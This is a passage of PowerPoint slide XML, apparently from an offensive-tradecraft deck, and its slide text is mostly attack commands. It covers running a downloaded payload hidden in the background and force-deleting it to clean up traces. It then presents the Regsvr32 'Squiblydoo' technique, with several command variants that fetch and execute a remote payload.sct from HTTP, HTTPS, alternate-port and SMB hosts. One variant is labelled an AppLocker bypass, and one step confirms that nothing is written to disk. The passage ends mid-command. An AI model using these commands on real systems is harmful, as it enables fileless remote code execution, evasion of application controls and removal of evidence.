                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>9 Execute downloaded payload in background (no window flash): start /b C:\temp\payload.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>10 Clean up traces (force delete): del /f C:\temp\payload.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21609948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A81D8035-C243-1E77-C9F0-751824237134}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="677724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F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Part 2 ○ Use Regsvr32.exe (</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Squiblydoo</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> attack) to execute a remote script without it ever touching the disk.</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a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Execute remote </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>scriptlet</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> (standard syntax): </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>regsvr32 /s /n /u /</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>i:http</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>://10.0.0.5/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>payload.sct</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t> scrobj.dll</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" defTabSz="914400" rtl="0" eaLnBrk="0" fontAlgn="base" latinLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buAutoNum type="arabicPeriod" startAt="2"/>
              <a:tabLst/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Execute remote </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>scriptlet</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> via HTTPS: </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>regsvr32 /s /n /u /</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>i:https</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>://web.com/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>payload.sct</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t> scrobj.dll</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" defTabSz="914400" rtl="0" eaLnBrk="0" fontAlgn="base" latinLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buAutoNum type="arabicPeriod" startAt="3"/>
              <a:tabLst/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Execute remote </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>scriptlet</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> via alternate port: </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>regsvr32 /s /n /u /</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>i:http</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>://10.0.0.5:8080/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>payload.sct</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t> scrobj.dll</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" defTabSz="914400" rtl="0" eaLnBrk="0" fontAlgn="base" latinLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buAutoNum type="arabicPeriod" startAt="4"/>
              <a:tabLst/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Execute remote </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>scriptlet</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> via UNC path (SMB share, no web server): </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>regsvr32 /s /n /u /</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>:\\10.0.0.5\share\</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>payload.sct</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t> scrobj.dll</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" defTabSz="914400" rtl="0" eaLnBrk="0" fontAlgn="base" latinLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buAutoNum type="arabicPeriod" startAt="5"/>
              <a:tabLst/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Alternate flag order (commonly used for AppLocker bypass): </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>regsvr32 /u /s /n /</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>i:http</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>://10.0.0.5/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>payload.sct</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t> scrobj.dll</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" defTabSz="914400" rtl="0" eaLnBrk="0" fontAlgn="base" latinLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buAutoNum type="arabicPeriod" startAt="6"/>
              <a:tabLst/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Execute with verbose output (remove </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>/s</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> for debugging): </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>regsvr32 /n /u /</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>i:http</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>://10.0.0.5/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>payload.sct</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t> scrobj.dll</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" defTabSz="914400" rtl="0" eaLnBrk="0" fontAlgn="base" latinLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buAutoNum type="arabicPeriod" startAt="7"/>
              <a:tabLst/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Verify no disk write occurred (script runs purely from memory): </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>dir</a:t>
            </a:r>
            <a:r>
